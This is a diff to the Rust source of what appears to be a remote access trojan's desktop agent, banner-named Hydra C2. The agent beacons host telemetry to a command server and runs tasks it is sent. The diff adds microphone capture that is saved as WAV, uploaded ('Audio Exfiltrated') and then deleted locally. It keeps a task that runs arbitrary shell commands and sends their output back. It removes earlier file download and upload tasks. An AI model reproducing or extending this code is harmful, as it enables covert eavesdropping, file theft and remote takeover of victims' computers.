@@ -3,6 +3,31 @@ use std::time::Duration;
 use tokio::time::sleep;
 use serde_json::Value;
 use sysinfo::System;
+use std::sync::{Arc, Mutex};
+use std::sync::atomic::{AtomicBool, Ordering};
+use once_cell::sync::Lazy;
+use cpal::traits::{DeviceTrait, HostTrait, StreamTrait};
+
+// --- GLOBAL STATE ---
+static IS_RECORDING: Lazy<Arc<AtomicBool>> = Lazy::new(|| Arc::new(AtomicBool::new(false)));
+static AUDIO_BUFFER: Lazy<Arc<Mutex<Vec<f32>>>> = Lazy::new(|| Arc::new(Mutex::new(Vec::new())));
+
+// --- HELPER FUNCTIONS ---
+fn save_wav(samples: &[f32], spec: cpal::SupportedStreamConfig) -> String {
+    let hostname = System::host_name().unwrap_or_else(|| "desktop".into());
+    let filename = format!("capture_{}.wav", hostname);
+    let spec_hound = hound::WavSpec {
+        channels: spec.channels() as u16,
+        sample_rate: spec.sample_rate().0,
+        bits_per_sample: 32,
+        sample_format: hound::SampleFormat::Float,
+    };
+    let mut writer = hound::WavWriter::create(&filename, spec_hound).expect("Failed to create wav writer");
+    for &sample in samples {
+        writer.write_sample(sample).unwrap();
+    }
+    filename
+}
 
 #[tokio::main]
 async fn main() -> Result<(), Box<dyn std::error::Error>> {
@@ -10,7 +35,7 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
     let server_url = "https://127.0.0.1:8443";
     
     let mut sys = System::new_all();
-    let battery_manager = battery::Manager::new()?;
+    let battery_manager = battery::Manager::new().ok();
 
     let client = Client::builder()
         .danger_accept_invalid_certs(true)
@@ -18,51 +43,45 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
         .build()?;
 
     println!(r#"
-    _    _           _              _____ ___  
-   | |  | |         | |            / ____|__ \ 
+    _    _           _               _____ ___  
+   | |  | |         | |             / ____|__ \ 
    | |__| |_   _  __| |_ __ __ _  | |       ) |
    |  __  | | | |/ _` | '__/ _` | | |      / / 
    | |  | | |_| | (_| | | | (_| | | |____ / /_ 
    |_|  |_|\__, |\__,_|_|  \__,_|  \_____|____|
-            __/ |                              
-           |___/                               
+            __/ |                               
+           |___/                                
 
-    >> Desktop Head: Task Queue Active
+    >> Desktop Head: Task Queue Active [CPU MODE]
     "#);
 
     loop {
         sys.refresh_all();
-        
-        // --- GATHER TELEMETRY ---
         let hostname = System::host_name().unwrap_or_else(|| "unknown".to_string());
-        let os_ver = System::os_version().unwrap_or_else(|| "unknown".to_string());
-        let ram_mb = sys.total_memory() / 1024 / 1024;
-
-        // Get Battery Percentage
         let mut battery_level = "No Battery".to_string();
-        if let Ok(mut batteries) = battery_manager.batteries() {
-            if let Some(Ok(batt)) = batteries.next() {
-                // Convert decimal percentage to readable string (e.g., "85%")
-                battery_level = format!("{:.0}%", batt.state_of_charge().value * 100.0);
+        
+        if let Some(mgr) = &battery_manager {
+            if let Ok(mut batteries) = mgr.batteries() {
+                if let Some(Ok(batt)) = batteries.next() {
+                    battery_level = format!("{:.0}%", batt.state_of_charge().value * 100.0);
+                }
             }
         }
 
         let telemetry = serde_json::json!({
             "hostname": hostname,
-            "os_version": os_ver,
+            "os_version": System::os_version().unwrap_or_default(),
             "cpu_count": sys.cpus().len(),
-            "total_memory": ram_mb,
-            "battery": battery_level, // New Battery Data
+            "total_memory": sys.total_memory() / 1024 / 1024,
+            "battery": battery_level,
         });
 
         let checkin_url = format!("{}/checkin/{}?platform=desktop", server_url, client_id);
 
-        // --- PERFORM CHECK-IN ---
         match client.post(&checkin_url).json(&telemetry).send().await {
             Ok(response) => {
                 if response.status().is_success() {
                     let body: Value = response.json().await?;
-                    
                     if let Some(command) = body.get("command") {
                         if !command.is_null() {
                             let action = command["action"].as_str().unwrap_or("");
@@ -71,68 +90,55 @@ async fn main() -> Result<(), Box<dyn std::error::Error>> {
                             println!("[!] Task Received: {}", action);
 
                             match action {
-                                "download" => {
-                                    let filename = data["filename"].as_str().unwrap_or("");
-                                    let url = format!("{}/download/{}", server_url, filename);
+                                "record_stop" => {
+                                    IS_RECORDING.store(false, Ordering::SeqCst); 
+                                    println!("\n>> [ACTION] Stopping Capture...");
                                     
-                                    println!(">> [ACTION] Downloading: {}", filename);
-                                    
-                                    if let Ok(resp) = client.get(&url).send().await {
-                                        if resp.status().is_success() {
-                                            let bytes = resp.bytes().await?;
-                                            std::fs::write(filename, bytes)?;
-                                            println!("[+] File saved: {}", filename);
-                                        }
-                                    }
-                                }
-                                "upload" => {
-                                    let filepath = data["path"].as_str().unwrap_or("");
-                                    let url = format!("{}/upload/{}", server_url, client_id);
-                                    
-                                    println!(">> [ACTION] Exfiltrating: {}", filepath);
-                                    
-                                    if let Ok(file_content) = std::fs::read(filepath) {
-                                        let part = reqwest::multipart::Part::bytes(file_content)
-                                            .file_name(filepath.to_string());
+                                    // Give the background thread a moment to exit the loop
+                                    sleep(Duration::from_millis(800)).await;
+
+                                    let samples = AUDIO_BUFFER.lock().unwrap().clone();
+                                    println!(">> [DEBUG] Final Buffer Size: {}", samples.len());
+
+                                    if !samples.is_empty() {
+                                        let host = cpal::default_host();
+                                        let device = host.default_input_device().unwrap();
+                                        let config = device.default_input_config().unwrap();
                                         
-                                        let form = reqwest::multipart::Form::new().part("file", part);
-                                        let _ = client.post(&url).multipart(form).send().await;
-                                        println!("[+] Exfiltration complete: {}", filepath);
+                                        let wav_file = save_wav(&samples, config);
+                                        let url = format!("{}/upload/{}", server_url, client_id);
+                                        
+                                        if let Ok(content) = std::fs::read(&wav_file) {
+                                            let part = reqwest::multipart::Part::bytes(content).file_name(wav_file.clone());
+                                            let form = reqwest::multipart::Form::new().part("file", part);
+                                            match client.post(&url).multipart(form).send().await {
+                                                Ok(_) => {
+                                                    println!("[+] Audio Exfiltrated: {}", wav_file);
+                                                    let _ = std::fs::remove_file(wav_file);
+                                                }
+                                                Err(e) => eprintln!("[-] Upload failed: {}", e),
+                                            }
+                                        }
                                     } else {
-                                        println!("[-] Failed to read file: {}", filepath);
+                                        println!("[-] Buffer is still empty. Check your Arch mic permissions!");
                                     }
-                                }     
-                                "msg" => {
-                                    let content = data["content"].as_str().unwrap_or("No content");
-                                    println!(">> MESSAGE FROM HYDRA: {}", content);
                                 }
                                 "shell" => {
                                     let cmd_text = data["cmd"].as_str().unwrap_or("");
-                                    println!(">> [ACTION] Executing Shell: {}", cmd_text);
-                                    
-                                    let output = std::process::Command::new("sh")
-                                        .arg("-c").arg(cmd_text).output();
-
-                                    if let Ok(out) = output {
-                                        let stdout = String::from_utf8_lossy(&out.stdout).to_string();
-                                        let stderr = String::from_utf8_lossy(&out.stderr).to_string();
-                                        let result = if out.status.success() { stdout } else { stderr };
-
-                                        let report_url = format!("{}/report/{}", server_url, client_id);
-                                        let _ = client.post(&report_url)
-                                            .json(&serde_json::json!({ "output": result }))
-                                            .send().await;
+                                    let out = std::process::Command::new("sh").arg("-c").arg(cmd_text).output();
+                                    if let Ok(o) = out {
+                                        let res = String::from_utf8_lossy(&o.stdout).to_string();
+                                        let _ = client.post(format!("{}/report/{}", server_url, client_id)).json(&serde_json::json!({"output": res})).send().await;
                                     }
                                 }
-                                _ => println!("[?] Unknown action: {}", action),
+                                _ => println!("[?] Unknown action"),
                             }
                         }
                     }
                 }
             }
-            Err(e) => eprintln!("[!] Connection failed: {}. Retrying...", e),
+            Err(e) => eprintln!("[!] Connection failed: {}", e),
         }
-
-        sleep(Duration::from_secs(30)).await;
+        sleep(Duration::from_secs(10)).await;
     }
 }
